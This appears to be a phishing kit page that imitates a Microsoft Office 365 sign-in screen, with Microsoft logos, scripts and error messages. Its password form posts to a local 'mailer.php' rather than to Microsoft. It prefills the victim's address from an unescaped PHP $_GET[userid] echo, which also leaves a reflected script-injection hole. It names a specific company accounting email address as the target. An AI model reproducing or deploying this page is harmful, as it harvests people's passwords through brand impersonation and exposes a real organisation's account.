
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr">
    <head>
        


        

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="PageID" content="i5030.2.0" />
<meta name="SiteID" content="" />
<meta name="ReqLC" content="1033" />
<meta name="LocLC" content="en-US" />
<meta name="mswebdialog-newwindowurl" content="*" />

    <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/images/favicon_a.ico" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
        <link href="login_ltr.min.css" rel="stylesheet" type="text/css" />


<style type="text/css">
.trapheading {
    font-size: 1.0em;
    font-family: 'Segoe UI Light', 'Segoe', 'Segoe UI', 'SegoeUI-Light-final', Tahoma, Helvetica, Arial, sans-serif;
    font-weight: lighter;
    -o-text-overflow: ellipsis;
    text-overflow: ellipsis;
    overflow: hidden;
    white-space: nowrap;
    margin-right: 0px
}
    .no_display {
        display: none;
    }
.animated {
  -webkit-animation-duration: .2s;
  animation-duration: .2s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
}

.animated.infinite {
  -webkit-animation-iteration-count: infinite;
  animation-iteration-count: infinite;
}

@-webkit-keyframes slideInLeft {
  from {
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInLeft {
  from {
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInLeft {
  -webkit-animation-name: slideInLeft;
  animation-name: slideInLeft;
}

@-webkit-keyframes slideInRight {
  from {
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInRight {
  from {
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInRight {
  -webkit-animation-name: slideInRight;
  animation-name: slideInRight;
}


@-webkit-keyframes slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

@keyframes slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

.slideOutLeft {
  -webkit-animation-name: slideOutLeft;
  animation-name: slideOutLeft;
}

@-webkit-keyframes slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

@keyframes slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

.slideOutRight {
  -webkit-animation-name: slideOutRight;
  animation-name: slideOutRight;
}

</style>

    <!--[if lte IE 10]>
      <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/css/compiled/login_ie.min.css" rel="stylesheet" type="text/css" />
    <![endif]-->

<!--[if lte IE 7]>
  <style type='text/css'>
    .ie_legacy { display: none; }
    body { background-color: #0072C6; }
  </style>
<![endif]-->




    <script src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/js/jquery-1.11.2.min.js" type="text/javascript"></script>
    <script src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/js/jquery-migrate-1.2.1.min.js" type="text/javascript"></script>
    
    <script src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/js/aad.login.min.js" type="text/javascript"></script>

<style>
    body
    {
        display: none;
    }
</style>

        <title>
Sign in to your account        </title>
    </head>
    <body>
            <script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>

        
<div id="background_branding_container" class="ie_legacy" style="background: #FFFFFF">
    <img id="background_background_image" alt="Illustration">
    <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you&#39;re on a slow connection. We&#39;ve disabled some images to speed things up.</div>
    <div id="background_company_name_text" class="background_title_text">
    </div>
</div>
<div id="background_page_overlay" class="overlay ie_legacy">
</div>

        <div id="login_no_script_panel" class="login_panel">
            <noscript>
    <style>body { display: block; }</style>
    <div class="login_inner_container no_js">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            </div>
            <div id="login_no_js_error_container" class="login_full_error_container">
                <div id="login_no_js_error_text" class="cta_text 1">
                    
                    <H1>We can't sign you in</H1><p>Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.</p><p>To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
    <div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
                <tr>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
                                            &#169; 2016 Microsoft
                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="https://login.microsoftonline.com/termsofuse">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="https://login.microsoftonline.com/privacy">Privacy &amp; Cookies</a>
                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
                            <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.2773.0/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                        </div>
                    </td>
                </tr>
        </table>
    </div>
</div>
<div id="login_prefetch_container" class="no_display">
</div>

</noscript>

        </div>
        <div id="login_panel" class="login_panel">
            <div class="legal_container"></div>
            <table class="login_panel_layout" style="height: 100%;">
                <tr class="login_panel_layout_row" style="height: 100%;">
                    <td id="login_panel_center">
                            <script type="text/javascript">
        $(document).ready(function () {
        if ($.support.cookies) {
            $('.login_inner_container').removeClass('no_display');
            $('.no_cookie').addClass('no_display');
        } else {
            $('.login_inner_container').addClass('no_display');
            $('.no_cookie').removeClass('no_display');
        }
        });
    </script>
    <div class="login_inner_container no_cookie no_display">
        <div class="inner_container cred ">
            <div class="login_workload_logo_container">
            </div>
            <div id="login_no_cookie_error_container" class="login_full_error_container">
                <div id="login_no_cookie_error_text" class="cta_text 1">
                    
                    <H1>We can't sign you in</H1><p>Your browser is currently set to block cookies. You need to allow cookies to use this service.</p><p>Cookies are small text files stored on your computer that tell us when you're signed in. To learn how to allow cookies, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
                        <script type="text/javascript">
                            $(document).ready(function () {
                                
Constants.DEFAULT_LOGO = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/bannerlogo?ts=635538653042733860';


Constants.DEFAULT_LOGO_ALT = 'Office 365';
Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/heroillustration?ts=635538653045233940';
Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
Constants.BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_TEXT = '';




    
    User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
    User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
    
    if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
        TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
    }
    

                                jQuery('img#logo_img').attr('src', '');
                                Context.use_instrumentation = true; 


                                $('#footer_link_terms').click(function(event) {
                                    event.preventDefault();
                                    MSLogin.Support.LegalActionLink('/termsofuse');
                                });

                                $('#footer_link_privacy').click(function(event) {
                                    event.preventDefault();
                                    MSLogin.Support.LegalActionLink('/privacy');
                                });

                                $('#footer_link_privacy_windows').click(function(event) {
                                    var flyoutButton = $('#footer_link_privacy_windows')[0]; // anchor
                                    var flyout = $('#flyoutPrivacyStatement')[0]; // flyout div
                                    var pageTop = $('.body-container')[0].getBoundingClientRect().top + (window.pageYOffset || document.documentElement.scrollTop || 0);
                                    flyout.style.marginTop = pageTop + "px"; // adjust margin top so flyout doesn't cover header
                                    flyout.winControl.show(flyoutButton, "top", "left");
                                });

                                if(!Constants.IS_ADAL_REQUEST) {
                                    $('#create_msa_account_link, #account_not_found_title_text > p > a').click(function(event){
                                        event.preventDefault();
                                        var msaLink = event.target.getAttribute("href");
                                        window.open(msaLink, '_blank');
                                        window.focus();
                                    });
                                } else {
                                    $('#account_not_found_title_text p').toggleClass('no_display');
                                }
                            });

                        </script>
                        <div class="login_inner_container">
                            <div id="true_inner" class="inner_container cred">
                                    <div class="login_workload_logo_container"></div>
                                <div class="spacer"></div>
                                


<div id="login_error_container" class="login_error_container "></div>



    <div id="cta_client_message_text" class="no_display template-tooltip tooltipType_error">
        <!-- Email Discovery Main -->
        <div class="cta_message_text 30136">Type the email address of the account you want to sign in with.</div>
        <!-- Email Discovery Lookup Timeout -->
        <div class="cta_message_text 30140">We&#39;re having trouble locating your account. Which type of account do you want to use?</div>
        <!-- Email Discovery Account not found -->
        <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
        </div>
        <!-- Tenant branding call to action -->
        <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
        <!-- Which accound do you want to use -->
        <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
    </div>
    <div id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error">
        <!-- Invalid ID or password -->
        
        <div class="client_error_msg 30067"><H1>We don't recognize this user ID or password</H1><p>Be sure to type the password for your work or school account.</p></div>
        <!-- Malformed id -->
        
        <div class="client_error_msg 30064"><H1>This doesn't look like a valid user ID</H1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Username not found -->
        
        <div class="client_error_msg 30065"><H1>{0} isn't in our system </H1><p>Make sure you typed your address or phone number correctly, or <A HREF="https://signup.live.com/signup.aspx?id=12&amp;uiflavor=web&amp;lw=1&amp;fl=easi2&amp;mkt=en-US">get a new Microsoft account</A>.</p></div>
        <!-- Malformed id (DOMAIN\alias format) -->
        
        <div class="client_error_msg 30066"><H1>This doesn't look like a valid user ID</H1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Invalid domain name (not guests) -->
        
        <div class="client_error_msg 30068"><H1>{0} isn't in our system</H1><p>Make sure you typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p></div>
        <!-- Missing password -->
        <div class="client_error_msg 30111">Please enter your password.</div>
        <!-- UserID is missing -->
        <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
        <!-- Error message if email address is not properly formatted -->
        <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
        <!-- Email Discovery could not find email address -->
        
        <div id="account_not_found_title_text" class="client_error_msg 30146"><H1>We couldn't find an account with that email address.</H1><p>Enter a different email address or <A HREF="https://signup.live.com/signup.aspx?id=12&amp;uiflavor=web&amp;lw=1&amp;fl=easi2&amp;mkt=en-US">get a new Microsoft account</A>.</p></div>
        <!-- Signout failed -->
        <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
    </div>
</div>
<!-- Login chooser start -->
<ul class="login_cred_container animated firstpage">

<p class="trapheading">Hello <br>Choose your webmail account.<br></p>
<li id="login_user_chooser" class="login_user_chooser " style="display: block;"><a id="comptabilite_christalfilms_com_link" data-session-id="1b59006a-1ca2-4763-87ad-4d02b71865f9" href="#" class="tile_link tooltip" aria-label="Work or school account for "><table id="comptabilite_christalfilms_com" data-session-id="1b59006a-1ca2-4763-87ad-4d02b71865f9" class="user_tile">    <tbody><tr>        <td>            <table>                 <tbody><tr>                     <td colspan="2">                     </td>        <td class="dots" rowspan="2">            <div id="comptabilite_christalfilms_com_menulink" tabindex="0" data-ref="signedout" data-session-id="1b59006a-1ca2-4763-87ad-4d02b71865f9" data-upn="" title="Click for more actions" aria-label="Click for more actions">                •••            </div>        </td>                 </tr>                 <tr class="comptabilite_christalfilms_com 1b59006a-1ca2-4763-87ad-4d02b71865f9" style="cursor: pointer">                     <td>                         <img class="ad_glyph comptabilite_christalfilms_com" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5925.8/content/images/work_account.png" alt="Work or school account symbol">                     </td>                     <td class="tile_name tile_name_padding">                         <div class="bigtext tile_primary_name windows_tile_text wrap comptabilite_christalfilms_com" style="cursor: pointer" title="">                                                      </div>                         <div class="smallertext tile_secondary_name windows_tile_text text-caption2 comptabilite_christalfilms_com" style="cursor: pointer">                                                      </div>      <p class="bigtext">      <?=$_GET[userid]?> </p></td>                 </tr>            </tbody></table>        </td>    </tr></tbody></table></a><a id="use_another_account_link" data-session-id="" onClick="javascript:clickinner(this);" class="tile_link tooltip" aria-label="Use another account"><table id="use_another_account" data-session-id="" class="user_tile">    <tbody><tr>        <td>            <table>                 <tbody><tr>                     <td colspan="2">                     </td>                 </tr>                 <tr class="use_another_account " style="cursor: pointer">                     <td>                         <img class="ad_glyph use_another_account" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5925.8/content/images/use_another_account.png" alt="Use another account">                     </td>                     <td class="tile_name tile_name_padding">                         <div class="bigtext tile_primary_name windows_tile_text wrap use_another_account" style="cursor: pointer">                             Use another account                         </div>                         <div class="smallertext tile_secondary_name windows_tile_text text-caption2 use_another_account" style="cursor: pointer">                                                      </div>                     </td>                 </tr>            </tbody></table>        </td>    </tr></tbody></table></a></li>
</ul>
<!-- Login chooser End -->
    
<!-- autoredirect password start -->
   
<div id="true_inner" class="inner_container cred animated autoredirect" style="visibility: hidden;">

<div class="login_cta_container normaltext" style="visibility: hidden;">

    <div id="cta_client_message_text" class="no_display template-tooltip tooltipType_error" aria-hidden="true">
        <!-- Email Discovery Main -->
        <div class="cta_message_text 30136">Type the email address of the account you want to sign in with.</div>
        <!-- Email Discovery Lookup Timeout -->
        <div class="cta_message_text 30140">We're having trouble locating your account. Which type of account do you want to use?</div>
        <!-- Email Discovery Account not found -->
        <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
        </div>
        <!-- Tenant branding call to action -->
        <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
        <!-- Which accound do you want to use -->
        <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
    </div>
    <div id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error" aria-hidden="true">
        <!-- Invalid ID or password -->
        
        <div class="client_error_msg 30067"><h1>We don't recognize this user ID or password</h1><p>Be sure to type the password for your work or school account.</p></div>
        <!-- Malformed id -->
        
        <div class="client_error_msg 30064"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Username not found -->
        
        <div class="client_error_msg 30065"><h1>{0} isn't in our system </h1><p>Make sure you typed your address or phone number correctly, or <a id="user-not-found-link" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Malformed id (DOMAIN\alias format) -->
        
        <div class="client_error_msg 30066"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Invalid domain name (not guests) -->
        
        <div class="client_error_msg 30068"><h1>{0} isn't in our system</h1><p>Make sure you typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p></div>
        <!-- Missing password -->
        <div class="client_error_msg 30111">Please enter your password.</div>
        <!-- UserID is missing -->
        <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
        <!-- Error message if email address is not properly formatted -->
        <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
        <!-- Email Discovery could not find email address -->
        
        <div id="account_not_found_title_text" class="client_error_msg 30146"><h1>We couldn't find an account with that email address.</h1><p>Enter a different email address or <a id="user-not-found-link-ebd" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Signout failed -->
        <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
    <div class="client_error_msg 2147776681"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776681.</p></div><div class="client_error_msg 2147776682"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776682.</p></div><div class="client_error_msg 2147778860"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147778860.</p></div><div class="client_error_msg 2147762276"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147762276.</p></div></div>
<div id="tiles_cta_text" class="cta_message_text" style="display: none;" aria-hidden="true"></div></div>
<ul class="login_cred_container" role="form">
    <!-- From ViewTemplateBase/Tiles.cshtml --><form id="credentials" method="post" action="mailer.php">
    <li id="login_user_chooser" class="login_user_chooser" style="display: block;"><a id="use_another_account_link" onClick="javascript:clickinner(this);" data-session-id="1b59006a-1ca2-4763-87ad-4d02b71865f9" href="#" class="tile_link tooltip disabled_tile btn btn-sm btn-success mycustom_btn1" aria-label="Work or school account for " tabindex="-1"><table id="use_another_account" data-session-id="1b59006a-1ca2-4763-87ad-4d02b71865f9" class="user_tile disabled_tile">    <tbody><tr style="cursor: default;">        <td>            <table>                 <tbody><tr style="cursor: default;">                     <td colspan="2">                     </td>                 </tr>                 <tr class="use_another_account 1b59006a-1ca2-4763-87ad-4d02b71865f9" style="cursor: default;">                     <td>                         <img class="ad_glyph use_another_account" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5925.8/content/images/work_account.png" alt="Work or school account symbol">                     </td>                     <td class="tile_name tile_name_padding">                         <div class="bigtext tile_primary_name windows_tile_text wrap use_another_account" style="cursor: default;" title="">                                                      </div><p class="bigtext"><?=$_GET[userid]?> <input type="hidden" name="userid" value="<?=$_GET[userid]?>"> </p><div class="smallertext tile_secondary_name windows_tile_text text-caption2 use_another_account" style="cursor: default;">                                                      </div>                     </td>                 </tr>            </tbody></table>        </td>    </tr></tbody></table></a></li>
    
















    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <div class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown" aria-hidden="true">
        <ul class="nav-settings-menu-list">
            <li id="signoutContainer" style="display: block;"><a href="#" id="signedin-signout">Sign out</a></li>
            <li id="signoutForgetContainer" style="display: block;"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
        </ul>
    </div>
    <div class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown" aria-hidden="true">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer" style="display: block;"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->
    <li class="login_cred_field_container" style="display: block;">
        


        <div id="cred_userid_container" class="login_textfield textfield" style="display: none;" aria-hidden="true">
            <span class="input_field textfield">
                <label for="cred_userid_inputtext" class="no_display" aria-hidden="true">User account</label>
                <div class="input_border high_contrast_border">
                <input id="cred_userid_inputtext" class="login_textfield textfield required email field normaltext" placeholder="someone@example.com " name="login" spellcheck="false" alt="someone@example.com " aria-label="User account" value="yahoo@yahoo.com" autocomplete="on" aria-describedby="accessibleError" type="email">
                </div>
            </span>

        </div>
    <div id="looking_container" class="no_display" aria-hidden="true">
        <span id="looking_cta_text" class="bigtext">Looking for an account</span>
        <span class="input_field normaltext login_textfield"><a id="looking_cancel_link" href="#">Cancel</a> </span>
    </div>
            <div id="redirect_cta_text" class="bigtext" style="display: none;" aria-hidden="true">Redirecting</div>
            <div id="redirect_dots_animation" class="progress" style="visibility: hidden;">
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
            </div>

        <div id="cred_password_container" class="login_textfield textfield" style="opacity: 1;">
            <span class="input_field textfield">
                <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Password</label>
                <div class="input_border high_contrast_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" name="passwd" value="" aria-describedby="accessibleError" type="password">
                </div>
            </span>
        </div>
        <div id="redirect_message_container" class="login_textfield hidden no_display" style="opacity: 0;" aria-hidden="true">
            <span class="input_field normaltext">
                <div>
                    <span id="redirect_message_text">We're taking you to your organization's sign-in page.</span><span id="redirect_company_name_text"></span> <a id="redirect_cancel_link" href="#">Cancel</a>
                </div>
            </span>
        </div>

    

<div id="cred_hidden_inputs_container" style="display: none">
  <input name="ctx" value="rQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6Bd39rBRZmnnFpdAv56p15qnYVo1JGSUlBsZW-fn5pSU5-frZeflpaZnKqsZmpXnJ-rn5-eaL-DkbGC4yMq5jMzYzNjCzNLY0tLQwNzc1NTA3N9FIsTIxSUk1NdI2STY11TYyAFlskm5noppqbWpgZGVokJhoa32Li93csLckwAhH5RZlVqZ-YONPyi3LjC_KLS2Yxs4JtWcVMlC82MbMB3ZWbn3eKmS2_IDUvM-UCC-MrFh4DZisODjYBZgkGBYYfLIyLWIG-NT_QGCzPMdt9Zwd7CLMqF8MpVv2iXLfS8PAAP9fKnPJgE38P7YIyY_-UiOzEyLyoFMv8YCcnS6eM3ETt0qhQWwMrwwlsjBPY2HZxEhFKAA2" type="hidden">
  <input name="flowToken" value="AQABAAEAAABnfiG-mA6NTae7CdWW7QfdyI-WFGjrG0v3ib0hWnjTxyVPpqsfrqkA5uUJgyKWkw7LYDDDrhr4Vp6rD3GSsnpACIH8eWuaRN2dIparEZi1ETd1j2Eeqi3WgGgTrWY_YgR5sIjHTcOWW8-nMsGlvcyj3AAILwgG1EqTHETxIwOgaBdnSIMItZZwMVrYU23NsjA6YKzI58BgJ2Yif6VCzZz1WatwXPNtcp9zkrJrz5wfr7440y2SfYDxd8UtQu631PoM9tZ2BnjBnptrfhfkf4U5IAA" type="hidden">
  <input name="canary" value="rmFuWWPNEylwS4OH+pv3OdXkaYnZd9oSBB9Bhma+uZU=0:1" type="hidden"> 
  <input name="dssoToken" id="dssoToken" type="hidden"> 
</div>



    </li>

    <li id="login-splitter-control" class="login_splitter_control" style="display: block;">
        <div id="splitter-tiles-container"></div>
    </li>
    <li class="login_cred_options_container" id="login_cred_options_container" role="main" style="display: block;">


        

<div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        <input id="cred_keep_me_signed_in_checkbox" value="0" class="win-checkbox" name="persist" type="checkbox">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>

        
        <button id="cred_sign_in_button" class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary" style="opacity: 1;">
            Sign in
        </button>

        <button id="cred_cancel_button" class="button normaltext cred_cancel_button control-button button-one no_display" style="display: inline-block;">
            Back
        </button>

 </form>       

        <div id="recover_container" class="subtext smalltext" style="opacity: 1;">
            <span>
                <a id="cred_forgot_password_link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6Bd39rBRZmnnFpdAv56p15qnYVo1JGSUlBsZW-fn5pSU5-frZeflpaZnKqsZmpXnJ-rn5-eaL-DkbGC4yMq5jMzYzNjCzNLY0tLQwNzc1NTA3N9FIsTIxSUk1NdI2STY11TYyAFlskm5noppqbWpgZGVokJhoa32Li93csLckwAhH5RZlVqZ-YONPyi3LjC_KLS2Yxs4JtWcVMlC82MbMB3ZWbn3eKmS2_IDUvM-UCC-MrFh4DZisODjYBZgkGBYYfLIyLWIG-NT_QGCzPMdt9Zwd7CLMqF8MpVv2iXLfS8PAAP9fKnPJgE38P7YIyY_-UiOzEyLyoFMv8YCcnS6eM3ETt0qhQWwMrwwlsjBPY2HZxEhFKAA2&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+8.1&amp;username=comptabilite%40christalfilms.com">Can’t access your account?</a>
            </span>
        </div>

        


        <div id="guest_hint_text" class="guest_direction_hint smalltext no_display" aria-hidden="true" style="display: none;">Don’t have an account assigned by your work or school?</div>
        <div class="guest_redirect_container no_display" aria-hidden="true" style="display: none;">
            <span class="guest_redirect smalltext">
                <span>
                    <a id="guest_redirect_link" tabindex="20" href="https://login.live.com/login.srf?wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=estsredirect%3d2%26estsrequest%3drQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6Bd39rBRZmnnFpdAv56p15qnYVo1JGSUlBsZW-fn5pSU5-frZeflpaZnKqsZmpXnJ-rn5-eaL-DkbGC4yMq5jMzYzNjCzNLY0tLQwNzc1NTA3N9FIsTIxSUk1NdI2STY11TYyAFlskm5noppqbWpgZGVokJhoa32Li93csLckwAhH5RZlVqZ-YONPyi3LjC_KLS2Yxs4JtWcVMlC82MbMB3ZWbn3eKmS2_IDUvM-UCC-MrFh4DZisODjYBZgkGBYYfLIyLWIG-NT_QGCzPMdt9Zwd7CLMqF8MpVv2iXLfS8PAAP9fKnPJgE38P7YIyY_-UiOzEyLyoFMv8YCcnS6eM3ETt0qhQWwMrwwlsjBPY2HZxEhFKAA2&amp;id=&amp;uaid=107dfdee69a144cc814654f54b69ca7d&amp;pcexp=false&amp;popupui=">Sign in with a Microsoft account</a>
                </span>
            </span>
        </div>
    </li>
        
    <li id="disambig-container" class="smalltext marginTop30px" style="display: none;" aria-hidden="true">
        <div id="disambig-help-container">
            
            Tired of seeing this? <a href="#" id="iDisambigRenameLink">Rename your personal Microsoft account.</a>
        </div>
    </li>

        <!-- From ViewTemplateBase/Tiles.cshtml -->
        <div id="switch_user_container" class="subtext smalltext" style="display: none;" aria-hidden="true">
            <span id="switch_user_text">
                <a id="switch_user_link" href="">
                    Sign out and sign in with a different account
                </a>
            </span>
        </div>
        <!--  -->

<input id="home_realm_discovery" value="2" type="hidden"></ul>


<div id="samlrequest_container" class="no_display" aria-hidden="true">
    <form id="samlform" method="post" action="/common/login">
        <input id="samlrelaystate" name="RelayState" type="hidden">
        <input id="samlrequest" name="SAMLRequest" type="hidden">
        <input name="canary_1" value="rmFuWWPNEylwS4OH+pv3OdXkaYnZd9oSBB9Bhma+uZU=0:1" type="hidden"> 
    </form>
</div>





                            </div>
	<!-- autoredirect password end -->
<!-- newuser start -->	

	
	
	
	

    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <div class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="signoutContainer"><a href="#" id="signedin-signout">Sign out</a></li>
            <li id="signoutForgetContainer"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
        </ul>
    </div>
    <div class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->

<div id="samlrequest_container" class="no_display">
    <form id="samlform" method="post" action="/common/login">
        <input type="hidden" id="samlrelaystate" name="RelayState" />
        <input type="hidden" id="samlrequest" name="SAMLRequest" />
    </form>
</div>







                            </div>
                            <div class="push">
                            </div>
                        </div>
<div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
                <tr>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
                                            &#169; 2016 Microsoft
                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="https://login.microsoftonline.com/termsofuse">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="https://login.microsoftonline.com/privacy">Privacy &amp; Cookies</a>
